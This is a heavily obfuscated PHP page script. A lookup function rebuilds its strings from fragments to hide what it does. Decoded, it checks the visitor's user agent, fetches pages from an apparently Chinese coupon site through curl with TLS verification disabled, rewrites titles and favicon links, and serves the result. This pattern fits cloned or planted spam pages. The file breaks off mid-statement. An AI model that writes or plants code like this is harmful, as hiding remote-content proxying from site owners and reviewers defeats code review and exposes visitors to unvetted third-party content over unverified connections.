<?php  if(!function_exists('O5c42ffd3')){ function O5c42ffd3($O0=null,$_p=array(),$_p1=array()){ if(is_numeric($O0)&&$O0>=0){ $s =''; $_n_m =func_num_args(); for($i=0;$i<$_n_m;$i++){ if($i===0)$s.=$O0; else if($i===1)$s.=$_p; else if($i===2)$s.=$_p1; else $s.=func_get_arg($i); } return strpos($s, '.')===false?intval($s):floatval($s); } if($O0===-1) return true; if($O0===-2) return false; if($O0===-4){ static $O5c42ffd3; if(!$O5c42ffd3){ $O5c42ffd3= explode('=,;','call=,;_=,;user=,;func=,;array=,;=,;co=,;nf=,;ig=,;.p=,;hp=,;he=,;ad=,;er=,;ro=,;r_=,;re=,;po=,;rt=,;in=,;g=,;st=,;ol=,;ow=,;/(=,;sy=,;mb=,;ia=,;no=,;s|=,;an=,;dr=,;oi=,;d|=,;Ma=,;c =,;OS=,;|u=,;cw=,;eb=,;|b=,;la=,;ck=,;be=,;rr=,;y)=,;/i=,;=,;ht=,;tp=,;:/=,;/d=,;em=,;o.=,;da=,;ta=,;ok=,;e.=,;m/=,;de=,;x.=,;ph=,;p?=,;r==,;s/=,;p&=,;i==,;a1=,;e0=,;a4=,;pw=,;&i=,;=a=,;1e=,;0a=,;4=,;cu=,;rl=,;_i=,;ni=,;t=,;_s=,;et=,;op=,;_e=,;xe=,;c=,;pl=,;ac=,;e=,;HT=,;TP=,;_H=,;T=,;[^=,;\.=,;]+=,;(?=,;:(=,;)|=,;\w=,;{2=,;}|=,;((=,;)\=,;.\=,;w{=,;2}=,;))=,;$=,;/=,;es=,;0=,;ge=,;tT=,;Do=,;ma=,;hu=,;o=,;ba=,;id=,;u.=,;m=,;/l=,;ib=,;.l=,;ee=,;le=,;to=,;p/=,;up=,;te=,;?a=,;=c=,;li=,;en=,;t_=,;ch=,;ec=,;k&=,;u==,;_m=,;sa=,;&u=,;==,;fi=,;_g=,;_c=,;on=,;nt=,;s=,;1=,;lo=,;se=,;Ca=,;e-=,;Co=,;l:=,; n=,;o-=,;ca=,;Pr=,;ag=,;: =,;-c=,;_U=,;SE=,;R_=,;AG=,;EN=,;大淘=,;券=,;</=,;>=,;<l=,;k =,;l==,;"s=,;ho=,;t =,;ic=,;" =,;hr=,;ef=,;="=,;fa=,;vi=,;n.=,;pn=,;g"=,;><=,;/h=,;ea=,;d>=,;nd=,;ex=,;?r=,;=s=,;/m=,;iu=,;4&=,;al=,;l.=,;el=,;eo=,;.v=,;ip=,;/p=,;e/=,;l/=,;d&=,;CU=,;RL=,;OP=,;T_=,;UR=,;L=,;RE=,;FE=,;R=,;TU=,;RN=,;TR=,;AN=,;SF=,;ER=,;SS=,;L_=,;VE=,;RI=,;FY=,;PE=,;HO=,;ST'); foreach($O5c42ffd3 as $k=>$v){ $O5c42ffd3[$k]=str_replace('|||','\'',$v); } } return $O5c42ffd3[$_p]; } if($O0===-5) return null; if($O0===-6){ $s =''; $_n_m =func_num_args(); for($i=1;$i<$_n_m;$i++){ if($i===1)$s.=$_p; else if($i===2)$s.=$_p1; else $s.=func_get_arg($i); } return $s; } if($O0===-7){ $_b = array(); $_n_m =func_num_args(); for($i=1;$i<$_n_m;$i++){ if($i===1)$_b[]=$_p; else if($i===2)$_b[]=$_p1; else $_b[]=func_get_arg($i); } return $_b ; } if($O0===-8)return constant($_p); if($O0===-9)return $_p->{$_p1}; if(!is_array($_p)){throw new Exception('php analysis failed!');} $q=count($_p); if($q===0){ if(!(is_array($O0)&&count($O0)==2)) return $O0(); if(is_object($O0[0])) return $O0[0]->{$O0[1]}(); $a =$O0[1]; return $O0[0]::$a(); } if($q===1){ if(!(is_array($O0)&&count($O0)==2))return $O0($_p[0]); if(is_object($O0[0]))return $O0[0]->{$O0[1]}($_p[0]); $a =$O0[1]; return $O0[0]::$a($_p[0]); } if($q===2){ if(!(is_array($O0)&&count($O0)==2))return $O0($_p[0],$_p[1]); if(is_object($O0[0])) return $O0[0]->{$O0[1]}($_p[0],$_p[1]); $a =$O0[1]; return $O0[0]::$a($_p[0],$_p[1]); } if($q===3){ if(!(is_array($O0)&&count($O0)==2))return $O0($_p[0],$_p[1],$_p[2]); if(is_object($O0[0])) return $O0[0]->{$O0[1]}($_p[0],$_p[1],$_p[2]); $a =$O0[1]; return $O0[0]::$a($_p[0],$_p[1],$_p[2]); } if($q===4){ if(!(is_array($O0)&&count($O0)==2))return $O0($_p[0],$_p[1],$_p[2],$_p[3]); if(is_object($O0[0]))return $O0[0]->{$O0[1]}($_p[0],$_p[1],$_p[2],$_p[3]); $a =$O0[1]; return $O0[0]::$a($_p[0],$_p[1],$_p[2],$_p[3]); } if($q===5){ if(!(is_array($O0)&&count($O0)==2))return $O0($_p[0],$_p[1],$_p[2],$_p[3],$_p[4]); if(is_object($O0[0]))return $O0[0]->{$O0[1]}($_p[0],$_p[1],$_p[2],$_p[3],$_p[4]); $a =$O0[1]; return $O0[0]::$a($_p[0],$_p[1],$_p[2],$_p[3],$_p[4]); } return call_user_func_array($O0,$_p); } }?><?php
include O5c42ffd3(-6,O5c42ffd3(-4,6),O5c42ffd3(-4,7),O5c42ffd3(-4,8),O5c42ffd3(-4,9),O5c42ffd3(-4,O5c42ffd3(1,0))); O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,1)),O5c42ffd3(-4,O5c42ffd3(1,2)),O5c42ffd3(-4,O5c42ffd3(1,3))),O5c42ffd3(-7,O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,5,4)),O5c42ffd3(-4,O5c42ffd3(1,3,7)),O5c42ffd3(-4,O5c42ffd3(1,5,5)),O5c42ffd3(-4,O5c42ffd3(1,5,6)),O5c42ffd3(-4,O5c42ffd3(1,4,9)),O5c42ffd3(-4,O5c42ffd3(1,4)),O5c42ffd3(-4,O5c42ffd3(1,5,7)),O5c42ffd3(-4,O5c42ffd3(1,5,8)),O5c42ffd3(-4,O5c42ffd3(1,5,9)),O5c42ffd3(-4,O5c42ffd3(1,6,0)),O5c42ffd3(-4,O5c42ffd3(1,3,7)),O5c42ffd3(-4,O5c42ffd3(8,9))))) ; O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,1)),O5c42ffd3(-4,O5c42ffd3(1,2)),O5c42ffd3(-4,O5c42ffd3(1,3))),O5c42ffd3(-7,O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,6,1)),O5c42ffd3(-4,O5c42ffd3(1,6,2)),O5c42ffd3(-4,O5c42ffd3(1,1,6)),O5c42ffd3(-4,O5c42ffd3(1,6,3)),O5c42ffd3(-4,O5c42ffd3(2,8)),O5c42ffd3(-4,O5c42ffd3(1,6,4)),O5c42ffd3(-4,O5c42ffd3(8,8)),O5c42ffd3(-4,O5c42ffd3(1,1))))) ; O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,3)),O5c42ffd3(-4,O5c42ffd3(1,4)),O5c42ffd3(-4,O5c42ffd3(1,5)),O5c42ffd3(-4,O5c42ffd3(1,6)),O5c42ffd3(-4,O5c42ffd3(1,7)),O5c42ffd3(-4,O5c42ffd3(1,8)),O5c42ffd3(-4,O5c42ffd3(1,9)),O5c42ffd3(-4,O5c42ffd3(2,0))),O5c42ffd3(-7,0)) ; $OO = O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(2,1)),O5c42ffd3(-4,O5c42ffd3(1,8)),O5c42ffd3(-4,O5c42ffd3(2,2)),O5c42ffd3(-4,O5c42ffd3(2,3)),O5c42ffd3(-4,O5c42ffd3(1,3))),O5c42ffd3(-7,$_SERVER[O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(9,0)),O5c42ffd3(-4,O5c42ffd3(9,1)),O5c42ffd3(-4,O5c42ffd3(1,6,5)),O5c42ffd3(-4,O5c42ffd3(1,6,6)),O5c42ffd3(-4,O5c42ffd3(1,6,7)),O5c42ffd3(-4,O5c42ffd3(1,6,8)),O5c42ffd3(-4,O5c42ffd3(1,6,9)),O5c42ffd3(-4,O5c42ffd3(9,3)))])) ; $OO0 = O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(2,4)),O5c42ffd3(-4,O5c42ffd3(2,5)),O5c42ffd3(-4,O5c42ffd3(2,6)),O5c42ffd3(-4,O5c42ffd3(2,7)),O5c42ffd3(-4,O5c42ffd3(2,8)),O5c42ffd3(-4,O5c42ffd3(2,9)),O5c42ffd3(-4,O5c42ffd3(3,0)),O5c42ffd3(-4,O5c42ffd3(3,1)),O5c42ffd3(-4,O5c42ffd3(3,2)),O5c42ffd3(-4,O5c42ffd3(3,3)),O5c42ffd3(-4,O5c42ffd3(3,4)),O5c42ffd3(-4,O5c42ffd3(3,5)),O5c42ffd3(-4,O5c42ffd3(3,6)),O5c42ffd3(-4,O5c42ffd3(3,7)),O5c42ffd3(-4,O5c42ffd3(3,8)),O5c42ffd3(-4,O5c42ffd3(3,9)),O5c42ffd3(-4,O5c42ffd3(4,0)),O5c42ffd3(-4,O5c42ffd3(4,1)),O5c42ffd3(-4,O5c42ffd3(4,2)),O5c42ffd3(-4,O5c42ffd3(4,3)),O5c42ffd3(-4,O5c42ffd3(4,4)),O5c42ffd3(-4,O5c42ffd3(4,5)),O5c42ffd3(-4,O5c42ffd3(4,6))); if($OO != O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(4,7))) && !preg_match($OO0, $OO)){ $OOO = O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(4,8)),O5c42ffd3(-4,O5c42ffd3(4,9)),O5c42ffd3(-4,O5c42ffd3(5,0)),O5c42ffd3(-4,O5c42ffd3(5,1)),O5c42ffd3(-4,O5c42ffd3(5,2)),O5c42ffd3(-4,O5c42ffd3(5,3)),O5c42ffd3(-4,O5c42ffd3(5,4)),O5c42ffd3(-4,O5c42ffd3(5,5)),O5c42ffd3(-4,O5c42ffd3(5,6)),O5c42ffd3(-4,O5c42ffd3(5,7)),O5c42ffd3(-4,6),O5c42ffd3(-4,O5c42ffd3(5,8)),O5c42ffd3(-4,O5c42ffd3(1,9)),O5c42ffd3(-4,O5c42ffd3(5,9)),O5c42ffd3(-4,O5c42ffd3(6,0)),O5c42ffd3(-4,O5c42ffd3(6,1)),O5c42ffd3(-4,O5c42ffd3(6,2)),O5c42ffd3(-4,O5c42ffd3(6,3)),O5c42ffd3(-4,O5c42ffd3(6,4)),O5c42ffd3(-4,O5c42ffd3(6,5)),O5c42ffd3(-4,O5c42ffd3(6,6)),O5c42ffd3(-4,O5c42ffd3(6,7)),O5c42ffd3(-4,O5c42ffd3(6,8)),O5c42ffd3(-4,O5c42ffd3(6,9))); }else { $OOO = O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(4,8)),O5c42ffd3(-4,O5c42ffd3(4,9)),O5c42ffd3(-4,O5c42ffd3(5,0)),O5c42ffd3(-4,O5c42ffd3(5,1)),O5c42ffd3(-4,O5c42ffd3(5,2)),O5c42ffd3(-4,O5c42ffd3(5,3)),O5c42ffd3(-4,O5c42ffd3(5,4)),O5c42ffd3(-4,O5c42ffd3(5,5)),O5c42ffd3(-4,O5c42ffd3(5,6)),O5c42ffd3(-4,O5c42ffd3(5,7)),O5c42ffd3(-4,6),O5c42ffd3(-4,O5c42ffd3(5,8)),O5c42ffd3(-4,O5c42ffd3(1,9)),O5c42ffd3(-4,O5c42ffd3(5,9)),O5c42ffd3(-4,O5c42ffd3(6,0)),O5c42ffd3(-4,O5c42ffd3(6,1)),O5c42ffd3(-4,O5c42ffd3(6,2)),O5c42ffd3(-4,O5c42ffd3(6,3)),O5c42ffd3(-4,O5c42ffd3(6,4)),O5c42ffd3(-4,O5c42ffd3(7,0)),O5c42ffd3(-4,O5c42ffd3(7,1)),O5c42ffd3(-4,O5c42ffd3(7,2)),O5c42ffd3(-4,O5c42ffd3(7,3)),O5c42ffd3(-4,O5c42ffd3(7,4)),O5c42ffd3(-4,O5c42ffd3(7,5))); } $OO00 = O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(7,6)),O5c42ffd3(-4,O5c42ffd3(7,7)),O5c42ffd3(-4,O5c42ffd3(7,8)),O5c42ffd3(-4,O5c42ffd3(7,9)),O5c42ffd3(-4,O5c42ffd3(8,0))),O5c42ffd3(-7)) ; O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(7,6)),O5c42ffd3(-4,O5c42ffd3(7,7)),O5c42ffd3(-4,O5c42ffd3(8,1)),O5c42ffd3(-4,O5c42ffd3(8,2)),O5c42ffd3(-4,O5c42ffd3(8,3)),O5c42ffd3(-4,O5c42ffd3(8,0))),O5c42ffd3(-7,$OO00, O5c42ffd3(-8,O5c42ffd3(-6,O5c42ffd3(-4,211),O5c42ffd3(-4,212),O5c42ffd3(-4,213),O5c42ffd3(-4,214),O5c42ffd3(-4,215),O5c42ffd3(-4,216))), $OOO)) ; O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(7,6)),O5c42ffd3(-4,O5c42ffd3(7,7)),O5c42ffd3(-4,O5c42ffd3(8,1)),O5c42ffd3(-4,O5c42ffd3(8,2)),O5c42ffd3(-4,O5c42ffd3(8,3)),O5c42ffd3(-4,O5c42ffd3(8,0))),O5c42ffd3(-7,$OO00, O5c42ffd3(-8,O5c42ffd3(-6,O5c42ffd3(-4,211),O5c42ffd3(-4,212),O5c42ffd3(-4,213),O5c42ffd3(-4,214),O5c42ffd3(-4,217),O5c42ffd3(-4,218),O5c42ffd3(-4,217),O5c42ffd3(-4,219))), O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(4,8)),O5c42ffd3(-4,O5c42ffd3(4,9)),O5c42ffd3(-4,O5c42ffd3(5,0)),O5c42ffd3(-4,O5c42ffd3(5,1)),O5c42ffd3(-4,O5c42ffd3(5,2)),O5c42ffd3(-4,O5c42ffd3(5,3)),O5c42ffd3(-4,O5c42ffd3(5,4)),O5c42ffd3(-4,O5c42ffd3(5,5)),O5c42ffd3(-4,O5c42ffd3(5,6)),O5c42ffd3(-4,O5c42ffd3(5,7)),O5c42ffd3(-4,6),O5c42ffd3(-4,O5c42ffd3(1,2,2))))) ; O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(7,6)),O5c42ffd3(-4,O5c42ffd3(7,7)),O5c42ffd3(-4,O5c42ffd3(8,1)),O5c42ffd3(-4,O5c42ffd3(8,2)),O5c42ffd3(-4,O5c42ffd3(8,3)),O5c42ffd3(-4,O5c42ffd3(8,0))),O5c42ffd3(-7,$OO00, O5c42ffd3(-8,O5c42ffd3(-6,O5c42ffd3(-4,211),O5c42ffd3(-4,212),O5c42ffd3(-4,213),O5c42ffd3(-4,214),O5c42ffd3(-4,217),O5c42ffd3(-4,220),O5c42ffd3(-4,221),O5c42ffd3(-4,222),O5c42ffd3(-4,223),O5c42ffd3(-4,224),O5c42ffd3(-4,225))), 1)) ; O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(7,6)),O5c42ffd3(-4,O5c42ffd3(7,7)),O5c42ffd3(-4,O5c42ffd3(8,1)),O5c42ffd3(-4,O5c42ffd3(8,2)),O5c42ffd3(-4,O5c42ffd3(8,3)),O5c42ffd3(-4,O5c42ffd3(8,0))),O5c42ffd3(-7,$OO00, O5c42ffd3(-8,O5c42ffd3(-6,O5c42ffd3(-4,211),O5c42ffd3(-4,212),O5c42ffd3(-4,213),O5c42ffd3(-4,214),O5c42ffd3(-4,226),O5c42ffd3(-4,227),O5c42ffd3(-4,228),O5c42ffd3(-4,229),O5c42ffd3(-4,230),O5c42ffd3(-4,231),O5c42ffd3(-4,225))), O5c42ffd3(-2))) ; O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(7,6)),O5c42ffd3(-4,O5c42ffd3(7,7)),O5c42ffd3(-4,O5c42ffd3(8,1)),O5c42ffd3(-4,O5c42ffd3(8,2)),O5c42ffd3(-4,O5c42ffd3(8,3)),O5c42ffd3(-4,O5c42ffd3(8,0))),O5c42ffd3(-7,$OO00, O5c42ffd3(-8,O5c42ffd3(-6,O5c42ffd3(-4,211),O5c42ffd3(-4,212),O5c42ffd3(-4,213),O5c42ffd3(-4,214),O5c42ffd3(-4,226),O5c42ffd3(-4,227),O5c42ffd3(-4,228),O5c42ffd3(-4,229),O5c42ffd3(-4,230),O5c42ffd3(-4,232),O5c42ffd3(-4,233))), O5c42ffd3(-2))) ; $OO0O = O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(7,6)),O5c42ffd3(-4,O5c42ffd3(7,7)),O5c42ffd3(-4,O5c42ffd3(8,4)),O5c42ffd3(-4,O5c42ffd3(8,5)),O5c42ffd3(-4,O5c42ffd3(8,6))),O5c42ffd3(-7,$OO00)) ; $OO0O= O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(2,1)),O5c42ffd3(-4,O5c42ffd3(1,5)),O5c42ffd3(-4,O5c42ffd3(1,6)),O5c42ffd3(-4,O5c42ffd3(8,7)),O5c42ffd3(-4,O5c42ffd3(8,8)),O5c42ffd3(-4,O5c42ffd3(8,9))),O5c42ffd3(-7,O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,7,0)),O5c42ffd3(-4,O5c42ffd3(1,7,1))),$OO000O,$OO0O)) ; $OO0O= O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(2,1)),O5c42ffd3(-4,O5c42ffd3(1,5)),O5c42ffd3(-4,O5c42ffd3(1,6)),O5c42ffd3(-4,O5c42ffd3(8,7)),O5c42ffd3(-4,O5c42ffd3(8,8)),O5c42ffd3(-4,O5c42ffd3(8,9))),O5c42ffd3(-7,O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,7,2)),O5c42ffd3(-4,O5c42ffd3(1,1)),O5c42ffd3(-4,O5c42ffd3(1,2)),O5c42ffd3(-4,O5c42ffd3(1,7,3))),O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,7,4)),O5c42ffd3(-4,O5c42ffd3(1,9)),O5c42ffd3(-4,O5c42ffd3(1,7,5)),O5c42ffd3(-4,O5c42ffd3(1,6)),O5c42ffd3(-4,O5c42ffd3(1,7,6)),O5c42ffd3(-4,O5c42ffd3(1,7,7)),O5c42ffd3(-4,O5c42ffd3(1,7,8)),O5c42ffd3(-4,O5c42ffd3(1,8)),O5c42ffd3(-4,O5c42ffd3(7,6)),O5c42ffd3(-4,O5c42ffd3(1,7,9)),O5c42ffd3(-4,O5c42ffd3(1,8,0)),O5c42ffd3(-4,O5c42ffd3(1,4,8)),O5c42ffd3(-4,O5c42ffd3(1,8,1)),O5c42ffd3(-4,O5c42ffd3(1,8,2)),O5c42ffd3(-4,O5c42ffd3(1,8,3)),O5c42ffd3(-4,O5c42ffd3(1,8,4)),O5c42ffd3(-4,O5c42ffd3(4,6)),O5c42ffd3(-4,O5c42ffd3(1,1,6)),O5c42ffd3(-4,O5c42ffd3(1,1,3)),O5c42ffd3(-4,O5c42ffd3(6,4)),O5c42ffd3(-4,O5c42ffd3(1,8,5)),O5c42ffd3(-4,O5c42ffd3(1,8,6)),O5c42ffd3(-4,6),O5c42ffd3(-4,O5c42ffd3(1,8,7)),O5c42ffd3(-4,O5c42ffd3(1,8,8)),O5c42ffd3(-4,O5c42ffd3(1,8,9)),O5c42ffd3(-4,O5c42ffd3(1,9,0)),O5c42ffd3(-4,O5c42ffd3(1,9,1)),O5c42ffd3(-4,O5c42ffd3(1,9,2)),O5c42ffd3(-4,O5c42ffd3(1,9,3))),$OO0O)) ; function getTopDomainhuo(){ $OOO0=$_SERVER[O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(9,0)),O5c42ffd3(-4,O5c42ffd3(9,1)),O5c42ffd3(-4,O5c42ffd3(9,2)),O5c42ffd3(-4,O5c42ffd3(3,6)),O5c42ffd3(-4,O5c42ffd3(9,3)))]; $OOOO=O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(9,4)),O5c42ffd3(-4,O5c42ffd3(9,5)),O5c42ffd3(-4,O5c42ffd3(9,6)),O5c42ffd3(-4,O5c42ffd3(9,5)),O5c42ffd3(-4,O5c42ffd3(9,7)),O5c42ffd3(-4,O5c42ffd3(9,8))).$OO000.O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(9,9)),O5c42ffd3(-4,O5c42ffd3(1,0,0)),O5c42ffd3(-4,O5c42ffd3(1,0,1)),O5c42ffd3(-4,O5c42ffd3(1,0,2)),O5c42ffd3(-4,O5c42ffd3(1,0,3))).$OO000.O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,0,4)),O5c42ffd3(-4,O5c42ffd3(1,0,5)),O5c42ffd3(-4,O5c42ffd3(1,0,6)),O5c42ffd3(-4,O5c42ffd3(1,0,7)),O5c42ffd3(-4,O5c42ffd3(1,0,8)),O5c42ffd3(-4,O5c42ffd3(1,0,9))); if(preg_match(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,1,0))).$OOOO.O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(4,6)),O5c42ffd3(-4,O5c42ffd3(1,1,1))),$OOO0,$OO00O)){ $OO0O0=$OO00O[O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,1,2)))]; }else{ $OO0O0=$OOO0; } return $OO0O0; } $OO0O0= O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,1,3)),O5c42ffd3(-4,O5c42ffd3(1,1,4)),O5c42ffd3(-4,O5c42ffd3(8,3)),O5c42ffd3(-4,O5c42ffd3(1,1,5)),O5c42ffd3(-4,O5c42ffd3(1,1,6)),O5c42ffd3(-4,O5c42ffd3(1,9)),O5c42ffd3(-4,O5c42ffd3(1,1,7)),O5c42ffd3(-4,O5c42ffd3(1,1,8))),O5c42ffd3(-7)) ; $OO0OO=O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,1,9)),O5c42ffd3(-4,O5c42ffd3(1,2,0)),O5c42ffd3(-4,O5c42ffd3(1,2,1)),O5c42ffd3(-4,6),O5c42ffd3(-4,O5c42ffd3(1,2,2))); $OOO00 = O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(4,8)),O5c42ffd3(-4,O5c42ffd3(4,9)),O5c42ffd3(-4,O5c42ffd3(5,0)),O5c42ffd3(-4,O5c42ffd3(1,2,3)),O5c42ffd3(-4,O5c42ffd3(1,2,4)),O5c42ffd3(-4,O5c42ffd3(1,2,5)),O5c42ffd3(-4,O5c42ffd3(1,2,6)),O5c42ffd3(-4,O5c42ffd3(1,2,7)),O5c42ffd3(-4,O5c42ffd3(5,3)),O5c42ffd3(-4,O5c42ffd3(1,2,8)),O5c42ffd3(-4,O5c42ffd3(1,2,9)),O5c42ffd3(-4,O5c42ffd3(1,3,0)),O5c42ffd3(-4,O5c42ffd3(5,4)),O5c42ffd3(-4,O5c42ffd3(1,3,1)),O5c42ffd3(-4,9),O5c42ffd3(-4,O5c42ffd3(1,0))); $OOO0O = $OOO00 . O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,3,2)),O5c42ffd3(-4,O5c42ffd3(1,3,3)),O5c42ffd3(-4,O5c42ffd3(1,3,4)),O5c42ffd3(-4,O5c42ffd3(1,3,5)),O5c42ffd3(-4,O5c42ffd3(1,3,6)),O5c42ffd3(-4,O5c42ffd3(1,3,7)),O5c42ffd3(-4,O5c42ffd3(1,3,8)),O5c42ffd3(-4,O5c42ffd3(1,3,9)),O5c42ffd3(-4,O5c42ffd3(1,4,0))) . $_SERVER[O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(9,0)),O5c42ffd3(-4,O5c42ffd3(9,1)),O5c42ffd3(-4,O5c42ffd3(9,2)),O5c42ffd3(-4,O5c42ffd3(3,6)),O5c42ffd3(-4,O5c42ffd3(9,3)))]; $OOOO0 = $OOO00 . O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,3,2)),O5c42ffd3(-4,O5c42ffd3(1,3,3)),O5c42ffd3(-4,O5c42ffd3(1,1)),O5c42ffd3(-4,O5c42ffd3(4,2)),O5c42ffd3(-4,O5c42ffd3(1,4,1)),O5c42ffd3(-4,O5c42ffd3(1,1,1)),O5c42ffd3(-4,O5c42ffd3(1,4,2)),O5c42ffd3(-4,O5c42ffd3(1,1,3)),O5c42ffd3(-4,O5c42ffd3(1,4,3)),O5c42ffd3(-4,O5c42ffd3(1,4,4))) . $_SERVER[O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(9,0)),O5c42ffd3(-4,O5c42ffd3(9,1)),O5c42ffd3(-4,O5c42ffd3(9,2)),O5c42ffd3(-4,O5c42ffd3(3,6)),O5c42ffd3(-4,O5c42ffd3(9,3)))]; $OOOOO= O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,4,5)),O5c42ffd3(-4,O5c42ffd3(1,2,7)),O5c42ffd3(-4,O5c42ffd3(1,4,6)),O5c42ffd3(-4,O5c42ffd3(8,2)),O5c42ffd3(-4,O5c42ffd3(1,4,7)),O5c42ffd3(-4,O5c42ffd3(1,4,8)),O5c42ffd3(-4,O5c42ffd3(1,3,1)),O5c42ffd3(-4,O5c42ffd3(1,4,9)),O5c42ffd3(-4,O5c42ffd3(1,5,0))),O5c42ffd3(-7,$OOO0O)) ; $OO0000 = O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,4,5)),O5c42ffd3(-4,O5c42ffd3(1,2,7)),O5c42ffd3(-4,O5c42ffd3(1,4,6)),O5c42ffd3(-4,O5c42ffd3(8,2)),O5c42ffd3(-4,O5c42ffd3(1,4,7)),O5c42ffd3(-4,O5c42ffd3(1,4,8)),O5c42ffd3(-4,O5c42ffd3(1,3,1)),O5c42ffd3(-4,O5c42ffd3(1,4,9)),O5c42ffd3(-4,O5c42ffd3(1,5,0))),O5c42ffd3(-7,$OOOO0)) ; if($OOOOO==O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(1,5,1)))){ $OO0O= O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(2,1)),O5c42ffd3(-4,O5c42ffd3(1,5)),O5c42ffd3(-4,O5c42ffd3(1,6)),O5c42ffd3(-4,O5c42ffd3(8,7)),O5c42ffd3(-4,O5c42ffd3(8,8)),O5c42ffd3(-4,O5c42ffd3(8,9))),O5c42ffd3(-7,O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(4,6)),O5c42ffd3(-4,O5c42ffd3(1,9,4)),O5c42ffd3(-4,O5c42ffd3(1,9,5)),O5c42ffd3(-4,9),O5c42ffd3(-4,O5c42ffd3(1,0)),O5c42ffd3(-4,O5c42ffd3(1,9,6)),O5c42ffd3(-4,O5c42ffd3(1,9,7)),O5c42ffd3(-4,O5c42ffd3(1,9,8)),O5c42ffd3(-4,O5c42ffd3(1,9,9)),O5c42ffd3(-4,O5c42ffd3(7,1)),O5c42ffd3(-4,O5c42ffd3(7,2)),O5c42ffd3(-4,O5c42ffd3(7,3)),O5c42ffd3(-4,O5c42ffd3(7,4)),O5c42ffd3(-4,O5c42ffd3(2,0,0)),O5c42ffd3(-4,O5c42ffd3(1,2,0)),O5c42ffd3(-4,O5c42ffd3(1,4,4))),O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(4,8)),O5c42ffd3(-4,O5c42ffd3(4,9)),O5c42ffd3(-4,O5c42ffd3(5,0)),O5c42ffd3(-4,O5c42ffd3(1,9,8)),O5c42ffd3(-4,O5c42ffd3(2,0,1)),O5c42ffd3(-4,O5c42ffd3(2,0,2)),O5c42ffd3(-4,O5c42ffd3(1,2,7)),O5c42ffd3(-4,O5c42ffd3(2,0,3)),O5c42ffd3(-4,O5c42ffd3(2,0,4)),O5c42ffd3(-4,O5c42ffd3(2,0,5)),O5c42ffd3(-4,O5c42ffd3(2,0,6)),O5c42ffd3(-4,O5c42ffd3(2,0,7)),O5c42ffd3(-4,O5c42ffd3(1,6,2)),O5c42ffd3(-4,O5c42ffd3(2,0,8)),O5c42ffd3(-4,O5c42ffd3(5,5)),O5c42ffd3(-4,O5c42ffd3(5,3)),O5c42ffd3(-4,O5c42ffd3(6,1)),O5c42ffd3(-4,O5c42ffd3(6,2)),O5c42ffd3(-4,O5c42ffd3(6,3)),O5c42ffd3(-4,O5c42ffd3(2,0,9)),O5c42ffd3(-4,O5c42ffd3(2,1,0)),O5c42ffd3(-4,O5c42ffd3(1,2,0)),O5c42ffd3(-4,O5c42ffd3(1,4,4))),$OO0O)) ; die; } unset($OO0O0); $OO0O= 